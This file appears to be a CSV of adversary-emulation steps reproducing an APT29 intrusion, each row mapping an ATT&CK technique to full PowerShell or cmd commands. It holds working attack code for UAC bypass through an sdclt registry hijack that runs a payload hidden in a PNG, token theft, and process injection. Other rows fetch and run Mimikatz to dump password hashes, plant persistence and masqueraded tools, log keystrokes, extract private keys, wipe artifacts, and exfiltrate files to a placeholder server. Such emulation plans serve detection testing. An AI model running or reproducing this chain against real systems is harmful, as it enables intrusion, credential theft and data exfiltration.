source_org,plan_id,adversary_name,scenario_id,step_idx,yaml_step_id,procedure_step,tactic,technique_attack_id,technique_name,name,description,command_summary,command_full
apt29,apt29,APT29,2,11,144b1384-5060-494f-80eb-91772695cdf3,2.D.2,discovery,T1007,System Service Discovery,System Service Discovery,The net utility is executed via cmd to enumerate local active services.,net start,net start
apt29,apt29,APT29,2,12,d2ea2676-7f85-4228-b980-ab3c0e1adc03,2.E.1,discovery,T1082,System Information Discovery,System Information Discovery,The systeminfo utility is executed via cmd to enumerate local operating system configuration.,systeminfo,systeminfo
apt29,apt29,APT29,2,13,7c2a6e5b-1adb-464f-a581-4677391f8dd6,2.E.2,discovery,T1082,System Information Discovery,System Information Discovery,The net utility is executed via cmd to enumerate local operating system configuration.,net config workstation,net config workstation
apt29,apt29,APT29,2,14,faa96e7f-081a-40b7-a743-a6a7f2627ea3,2.F.1,discovery,T1069,Permission Groups Discovery,Permissions Groups Discovery,The net utility is executed via cmd to enumerate members of the local system's administrators group.,net localgroup administrators,net localgroup administrators
apt29,apt29,APT29,2,15,26181249-be75-41ed-9fe7-5c30ea8c2d4d,2.F.2,discovery,T1069,Permission Groups Discovery,Permissions Groups Discovery,The net utility is executed via cmd to enumerate members of the domain controller’s administrators group.,net localgroup administrators /domain,net localgroup administrators /domain
apt29,apt29,APT29,2,16,84377d7a-0363-44fd-a082-44657ca1858f,2.F.3,discovery,T1069,Permission Groups Discovery,Permissions Groups Discovery,The net utility is executed via cmd to enumerate members of the domain administrators group.,"cmd.exe /c net group ""Domain Admins"" /domain","cmd.exe /c net group ""Domain Admins"" /domain"
apt29,apt29,APT29,2,17,61221fb9-cb32-46d5-98fd-90567a621526,2.G.1,discovery,T1087,Account Discovery,Account Discovery,The net utility is executed via cmd to enumerate domain user accounts.,net user /domain,net user /domain
apt29,apt29,APT29,2,18,9ce5bf9f-44ec-44c4-bbe0-6d68a83e1b76,2.G.2,discovery,T1087,Account Discovery,Account Discovery,The net utility is executed via cmd to enumerate detailed information about a specific user account.,net user %USERNAME% /domain,net user %USERNAME% /domain
apt29,apt29,APT29,2,19,5c23f638-9cfc-4fc4-9cab-4af628fef70a,2.H.1,discovery,T1012,Query Registry,Query Registry,The reg utility is executed via cmd to enumerate a specific Registry key associated with local system policies to ensure that the user will not be prompted for credentials when elevating permissions.,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System,reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
apt29,apt29,APT29,3,20,68b588bc-002a-42dc-bac7-9189f944065b,3.A.1,defensive-evasion,T1036.005,Masquerading: Match Legitimate Name or Location,Staging monkey PNG,Staging PNG for Lateral Movement,"$username=""#{profile_user}""; if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) { copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force; if ($? -eq $True) { write-host ""...","$username=""#{profile_user}"";
if ( $(test-path -path ""C:\Users\$username\Downloads\monkey.png"") -eq $false ) {
  copy-item monkey.png -Destination ""C:\Users\$username\Downloads\\"" -Force;
  if ($? -eq $True) {
    write-host ""[+] Successfully copied monkey.png!"";
    get-childitem -path ""C:\Users\$username\Downloads\\"";
    exit 0;
  } else {
    write-host ""[+] Failed to copy monkey.png."";
    exit 1;
  }"
apt29,apt29,APT29,3,21,1345bff7-6f26-43b2-a92a-9aabccdb3db0,3.A.2,privilege-escalation,T1134.001,Access Token Manipulation: Token Impersonation/Theft,Bypass User Account Control,"A UAC bypass technique is executed to steal the token of an existing high-integrity process and launch a new, high-integrity RAT with limited functionality.",Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force; Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force; $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(...,"Import-Module .\Invoke-BypassUACTokenManipulation.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
Invoke-BypassUACTokenManipulation -Arguments ""-nop -exec bypass -EncodedCommand $pcode"" -Verbose"
apt29,apt29,APT29,3,22,89e9dffa-8836-4672-8cf3-bebd006d2a2b,3.A.3,privilege-escalation,T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,UAC Bypass via Backup Utility,Modify registry values of sdclt to bypass UAC,"if (!(test-path -path $env:windir\system32\sdclt.exe)) { write-host ""[!] sdclt.exe was not found on this host.""; exit 1; } New-Item -Path HKCU:\Software\Classes -Name Folder -Force; New-Item -Path HKCU:\Software\Class...","if (!(test-path -path $env:windir\system32\sdclt.exe)) {
  write-host ""[!] sdclt.exe was not found on this host."";
  exit 1;
}
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;

$username=""#{profile_user}"";
$payload='powershell.exe -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName ""System.Drawing""; $g=a System.Drawing.Bitmap(""C:\Users\$($username)\Downloads\monkey.png"");$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""';

Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""(Default)"" -Value $payload -Force;
Set-ItemProperty -Path ""HKCU:\Software\Classes\Folder\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force;

cmd.exe /c sdclt.exe;
cmd.exe /c powershell.exe;"
apt29,apt29,APT29,3,23,5ff80022-8d85-410b-b868-6c7565b267e5,3.B,defensive-evasion,T1112,Modify Registry,Registry Cleanup for UAC Bypass Technique,Delete registry entries post-UAC bypass.,"Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force; if (!(test-path -path HKCU:\Software\Classes\Folder)) { write-host ""[+] Reg keys removed!""; }","Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force;
if (!(test-path -path HKCU:\Software\Classes\Folder)) {
  write-host ""[+] Reg keys removed!"";
  }"
apt29,apt29,APT29,3,24,088b8639-3f37-42cc-9dc8-01aabb645461,3.C,privilege-escalation,T1055,Process Injection,Process Injection,"The limited functionality high-integrity RAT will inject malicious code into an existing fully functional high-integrity process, resulting in a new elevated, fully functional high-integrity RAT.","Import-Module .\Invoke-PSInject.ps1 -Verbose -Force; Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force; $pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $en...","Import-Module .\Invoke-PSInject.ps1 -Verbose -Force;
Move-Item -Path .\update.ps1 -Destination $env:APPDATA -Force;
$pcode = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""Import-Module $env:APPDATA\update.ps1;update('#{server}')""));
Inject -PoshCode $pcode;"
apt29,apt29,APT29,4,25,4f7d21c9-ea31-4943-ad8a-efbbeeccdd7d,4.A.1,stage-capabilities,T1036.005,Masquerading: Match Legitimate Name or Location,Planting Modified Sysinternals Utilities,Uploading payloads masquerading as via modified SysInternalsSuite,"iwr -uri ""https://download.sysinternals.com/files/SysinternalsSuite.zip"" -outfile SysInternalsSuite.zip; Expand-Archive -Path SysInternalsSuite.zip -DestinationPath ""C:\Users\#{profile_user}\Downloads\SysInternalsSuit...","iwr -uri ""https://download.sysinternals.com/files/SysinternalsSuite.zip"" -outfile SysInternalsSuite.zip;
Expand-Archive -Path SysInternalsSuite.zip -DestinationPath ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -Force;

if (! $?) {
  write-host ""Error moving files to #{profile_user}\Downloads"";
  exit 1;
}

Move-Item Modified-SysInternalsSuite.zip ""C:\Users\#{profile_user}\Downloads"" -Force;
Expand-Archive -LiteralPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -DestinationPath ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -Force;

if (! $?) {
  write-host ""Error expanding files to #{profile_user}\Downloads"";
  exit 1;
}

$dir_exists=Test-Path -path ""C:\Program Files\SysInternalsSuite"";
if ($dir_exists -eq $true) {
  write-host ""[*] SysInternalsSuite folder exists within \""C:\Program Files\"", copying over payloads then removing folder from Downloads."";
  Move-Item -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
  Move-Item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
} else {
  mkdir ""C:\Program Files\SysInternalsSuite"";
  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
  Copy-Item -Path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite\\*"" -Destination ""C:\Program Files\SysInternalsSuite\\"" -Force;
}

if (test-path -path ""SysInternalsSuite.zip"") {
  Remove-Item -path ""filesystem::SysInternalsSuite.zip"" -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" ) {
  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite.zip"" -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"") {
  remove-item -path ""C:\Users\#{profile_user}\Downloads\Modified-SysInternalsSuite"" -recurse -force;
}

if (test-path -path ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"") {
  Remove-Item -path  ""C:\Users\#{profile_user}\Downloads\SysInternalsSuite"" -recurse -force;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if ($?) {
  gci;
  write-host ""[*] Successfully planted files""
} else {
  write-host ""[!] Error downloading and planting modified system tools.""
}"
apt29,apt29,APT29,4,26,59592c35-8207-4896-8d8b-36ad4600245d,4.A.2,discovery,T1018,Remote System Discovery,Remote System Discovery,The net utility is executed via cmd to enumerate DCs within the domain,"cmd.exe /c net group ""Domain Controllers"" /domain","cmd.exe /c net group ""Domain Controllers"" /domain"
apt29,apt29,APT29,4,27,24ed020e-4730-4000-b6b4-6b5d3e95314f,4.A.3,discovery,T1018,Remote System Discovery,Remote System Discovery,The net utility is executed via cmd to enumerate hosts within the domain.,"cmd.exe /c net group ""Domain Computers"" /domain","cmd.exe /c net group ""Domain Computers"" /domain"
apt29,apt29,APT29,4,28,5f4263c4-7ff1-4098-b5f5-f41faa31cf5b,4.B.1,discovery,T1016,System Network Configuration Discovery,System Network Configuration Discovery,The netsh utility is executed via cmd to enumerate local firewall configuration information.,netsh advfirewall show allprofiles,netsh advfirewall show allprofiles
apt29,apt29,APT29,4,29,646be6c9-f27a-4f5f-be5d-b8a0317e215f,4.B.2,discovery,T1057,Process Discovery,Process Discovery,List running process on the machine via PowerShell.,$ps = get-process; write-output $ps;,"$ps = get-process;
write-output $ps;"
apt29,apt29,APT29,4,30,9b5b5aec-32ff-4d74-8555-727b50ab15f6,4.B.3,defensive-evasion,T1070.004,Indicator Removal on Host: File Deletion,Artifact Cleanup - Delete Files,Cleanup files related to Operation,"if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"";)) { write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\Sys...","if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"";)) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysInternalsSuite"";
gci $env:userprofile\Desktop;
.\sdelete64.exe /accepteula ""$env:USERPROFILE\Desktop\‮cod.3aka3.scr"";
.\sdelete64.exe /accepteula ""$env:APPDATA\Draft.Zip"";
.\sdelete64.exe /accepteula ""$env:USERPROFILE\Downloads\SysInternalsSuite.zip"";"
apt29,apt29,APT29,4,31,6f1f4768-7099-45d2-a858-b49dc792234e,4.C.1,discovery,T1082,System Information Discovery,Loading Stage-2 & Performing Discovery,Load Stage-2 from Modified Sysinternals Toolset,"if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\SysI...","if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if (!(test-path "".\readme.ps1"")) {
  Move-Item .\readme.txt readme.ps1 -Force;
}
. .\readme.ps1;
Invoke-Discovery;"
apt29,apt29,APT29,4,32,ba0b398d-91b8-490a-bed2-f959afa8e1aa,4.C.2,discovery,T1049,System Network Connections Discovery,4.C.2 - System Network Connections Discovery (T1049),The netstat utility is executed via cmd to enumerate local active network connections.,netstat -ano,netstat -ano
apt29,apt29,APT29,5,33,effbedc1-1bc8-4a75-9395-980559700008,5.A.1,credential-access,T1003,Credential Dumping,Credential Dumping using Process Injection,Mimikatz lsadump::sam is executed via Invoke-Mimikatz to dump hashes via process injection into LSASS.,"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }; $web = (New-Object System.Net.WebClient); $result = $web.DownloadString(""https://raw.githubusercontent.com/EmpireProject/Empire/master...","[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
$web = (New-Object System.Net.WebClient);
$result = $web.DownloadString(""https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1"");
iex $result;
function hashdump
{
    Invoke-Mimikatz -Command ""privilege::debug token::elevate lsadump::sam exit""
};
hashdump;"
apt29,apt29,APT29,5,34,9c75155e-21ab-4471-af16-45f3795a313c,5.A.2,persistence,T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,Persistent Service 1,Leverage modified Sysinternals,"Set-Location -path ""C:\Program Files\SysinternalsSuite""; if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) { write-host ""[*] Service already exists...Not running persistence step-1""; exit 1; } if (Test-...","Set-Location -path ""C:\Program Files\SysinternalsSuite"";
if (get-service -name ""javamtsup"" -ErrorAction SilentlyContinue) {
  write-host ""[*] Service already exists...Not running persistence step-1"";
  exit 1;
}

if (Test-Path -path ""readme.ps1"") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 1;
  write-host ""[+] Persistence 1 invoked."";
  exit 0;

} else {
  write-host ""[!] readme.ps1 not found."";
  exit 1;
}"
apt29,apt29,APT29,5,35,45f18b58-c14f-4b61-a3da-41b67af21429,5.B.1,persistence,T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,Persistent Service 2,Leverage modified Sysinternals,"Set-Location -path ""C:\Program Files\SysinternalsSuite""; if (Test-Path -path ""readme.ps1"") { . .\readme.ps1; Invoke-Persistence -PersistStep 2; write-host ""[+] Persistence 2 invoked.""; } else { write-host ""[!] readme....","Set-Location -path ""C:\Program Files\SysinternalsSuite"";
if (Test-Path -path ""readme.ps1"") {
  . .\readme.ps1;
  Invoke-Persistence -PersistStep 2;
  write-host ""[+] Persistence 2 invoked."";

} else {
  write-host ""[!] readme.ps1 not found."";
  return 1;
}"
apt29,apt29,APT29,5,36,03afada1-1714-408f-bde5-f528b91dc89d,5.B.2,defensive-evasion,T1134,Access Token Manipulation,Access Token Manipulation,"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;"
apt29,apt29,APT29,6,37,e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d,6.A.1,credential-access,T1003,Credential Dumping,Credentials In Files- Chrome,Obtain credentials from Chrome Dumper,"if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\Sysi...","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
./accesschk.exe -accepteula .;"
apt29,apt29,APT29,6,38,1b9e018d-986d-42d9-bb8b-0e104e98ce9c,6.A.2,defensive-evasion,T1134,Access Token Manipulation,Query Registry,"A token theft script was executed to steal and assume the token of another user’s existing process, changing the user context of the process.","Import-Module .\StealToken.ps1 -Verbose -Force; StealToken; CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""'; CreateProcessWithT...","Import-Module .\StealToken.ps1 -Verbose -Force;
StealToken;
CreateProcessWithToken -CommandLine 'cmd.exe /c reg query ""\\#{remote.file.share}\hklm\system\currentcontrolset\control\terminal server""';
CreateProcessWithToken -CommandLine 'cmd.exe /c schtasks /create /tn ""Resume Viewer Update Checker"" /tr "".\sandcat.exe #{server} evals"" /sc ONLOGON /RU SYSTEM';
CreateProcessWithToken -CommandLine 'cmd.exe /c dir /s /b #{remote.file.share}';
CreateProcessWithToken -CommandLine 'cmd.exe /c tree %USERPROFILE%';
RevertToSelf;"
apt29,apt29,APT29,6,39,c4f4b13c-87b6-498c-b814-93570173068c,6.B,credential-access,T1552.004,Unsecured Credentials: Private Keys,Credentials In Files (T1081) - Private Keys Extraction,Obtain credentials via Custom PowerShell,"Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My; if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\Sy...","Import-PfxCertificate -Exportable -FilePath "".\dmevals.local.pfx"" -CertStoreLocation Cert:\LocalMachine\My;

if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\readme.ps1;
Get-PrivateKeys;
if ($? -eq $True) {
    write-host ""[+] Successfully executed private key collection script."";
    exit 0;
} else {
    write-host ""[!] Error, could not execution Get-PrivateKeys."";
    exit 1;
}"
apt29,apt29,APT29,7,40,a4b14c10-49aa-4ae4-b165-d5a37364fe62,7.A.1,defensive-evasion,T1036.005,Masquerading: Match Legitimate Name or Location,Staging files for PowerShell module imports,Renaming psversion.txt to psversion.txt to be imported,"if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\SysI...","if (! $(test-path -path ""C:\Program Files\SysInternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysInternalsSuite does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysInternalsSuite"";
if (test-path -path "".\psversion.txt"" ) {
  move-item .\psversion.txt psversion.ps1 -Force;
}
  write-host ""[+] File psversion.ps1 staged to be imported."""
apt29,apt29,APT29,7,41,a81ea4ad-bc9f-49a7-82d4-4466df641487,7.A.2,collection,T1113,Screen Capture,Screen Capturing,Load custom PowerShell module and take screenshots.,"if (! $(test-path -path ""C:\Program Files\SysinternalsSuite\psversion.ps1"";)) { write-host ""[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped.""; exit 1; } Set-Location...","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite\psversion.ps1"";)) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite\psversion.ps1 does not exist. Execution has stopped."";
  exit 1;
}

Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Invoke-ScreenCapture; Start-Sleep -Seconds 3; View-Job -JobName ""Screenshot"";"
apt29,apt29,APT29,7,42,ee4c2eab-be57-434c-a32c-14b77360301a,7.A.3,collection,T1115,Clipboard Data,Automated Collection (T1119) - Clipboard (T1115),Get contents of clipboard,"$clip_data=get-clipboard; if ($clip_data.Length -gt 0) { write-host ""[+] Clipboard data obtained!\n""; write-host $clip_data; } else { write-host ""[!] No clipboard data available!\n""; }","$clip_data=get-clipboard;
if ($clip_data.Length -gt 0) {
  write-host ""[+] Clipboard data obtained!\n"";
  write-host $clip_data;
} else {
  write-host ""[!] No clipboard data available!\n"";
}"
apt29,apt29,APT29,7,43,db28f68d-e8b8-46e6-b680-642570d4b257,7.A.4,collection,T1056.001,Input Capture: Keylogging,Automated Collection (T1119) - Input Capture (T1417),"Load custom PowerShell module, and grab keystrokes for 15 seconds.","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) { write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.""; exit 1; } Set-Location -path ""C:\Program Files\Sysi...","if (! $(test-path -path ""C:\Program Files\SysinternalsSuite"")) {
  write-host ""[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped."";
  exit 1;
}
Set-Location -path ""C:\Program Files\SysinternalsSuite"";
. .\psversion.ps1;
Get-Keystrokes;
Start-Sleep -Seconds 15;
View-Job -JobName ""Keystrokes"";"
apt29,apt29,APT29,7,44,a612311d-a802-48da-bb7f-88a4b9dd7a24,7.B.1,exfiltration,T1041,Exfiltration Over C2 Channel,Data from staged file (T1074) and Exfiltration over C2 Channel (T1041),Compress all data within Download directory and exfiltrate the results.,"Write-Host ""[*] Compressing all the things in download dir""; Compress-Archive -Path ""C:\Users\#{profile_user}\Downloads\*.*"" -DestinationPath ""$env:APPDATA\OfficeSupplies.zip""; Import-Module .\upload.ps1 -Verbose -For...","Write-Host ""[*] Compressing all the things in download dir"";
Compress-Archive -Path ""C:\Users\#{profile_user}\Downloads\*.*"" -DestinationPath ""$env:APPDATA\OfficeSupplies.zip"";

Import-Module .\upload.ps1 -Verbose -Force;
Invoke-MultipartFormDataUpload -InFile ""$env:APPDATA\OfficeSupplies.zip"" -Uri ""#{server}/file/upload"";
if ($?) {
  write-host ""[+] Data exfil of download directory completed!"";
} else {
  write-host ""[!] Data exfil failed!"";
}"
